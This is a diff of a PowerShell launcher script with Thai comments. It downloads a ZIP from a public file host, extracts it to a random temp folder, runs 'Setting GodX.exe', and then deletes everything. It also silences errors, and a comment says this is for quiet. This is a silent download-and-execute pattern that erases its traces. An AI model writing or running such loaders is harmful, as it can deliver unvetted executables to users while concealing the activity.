@@ -1,21 +1,26 @@
-# 1. กำหนดชื่อและ Path
-$exeName = "SETTING_GODX.exe"
-$zipName = "SETTING_GODX.zip"
-$tempPath = "$env:TEMP"
-$url = "ใส่_Direct_Link_ของ_ไฟล์_ZIP_จาก_Catbox"
+# ปิดการแสดงผลเพื่อความเงียบ
+$ErrorActionPreference = 'SilentlyContinue'
 
-# 2. ดาวน์โหลดไฟล์ .zip
-$webClient = New-Object System.Net.WebClient
-$webClient.DownloadFile($url, "$tempPath\$zipName")
+# 1. กำหนดค่า
+$zipName = "Setting GodX.zip"
+$exeName = "Setting GodX.exe"
+$url = "https://files.catbox.moe/afb9rh.zip"
+$tempDir = Join-Path $env:TEMP ([Guid]::NewGuid().ToString())
+$zipPath = Join-Path $tempDir $zipName
 
-# 3. แตกไฟล์ .zip
+# 2. สร้างที่เก็บชั่วคราว
+New-Item -ItemType Directory -Path $tempDir | Out-Null
+
+# 3. โหลดและแตกไฟล์
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $zipPath)
 Add-Type -AssemblyName System.IO.Compression.FileSystem
-[System.IO.Compression.ZipFile]::ExtractToDirectory("$tempPath\$zipName", $tempPath)
+[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)
 
-# 4. รันโปรแกรมและรอให้ปิด
-$process = Start-Process "$tempPath\$exeName" -PassThru
-$process.WaitForExit()
+# 4. รันโปรแกรม (ใช้ & และกำหนด Working Directory เพื่อให้ GUI ขึ้น)
+$exePath = Join-Path $tempDir $exeName
+$proc = Start-Process -FilePath $exePath -WorkingDirectory $tempDir -PassThru
 
-# 5. ลบทั้งไฟล์ .exe และ .zip ทิ้งหลังปิดโปรแกรม
-Remove-Item "$tempPath\$exeName" -Force
-Remove-Item "$tempPath\$zipName" -Force
+# 5. รอจนกว่าจะปิดโปรแกรม แล้วลบโฟลเดอร์ทิ้งให้หมดจด
+$proc.WaitForExit()
+Remove-Item $tempDir -Recurse -Force
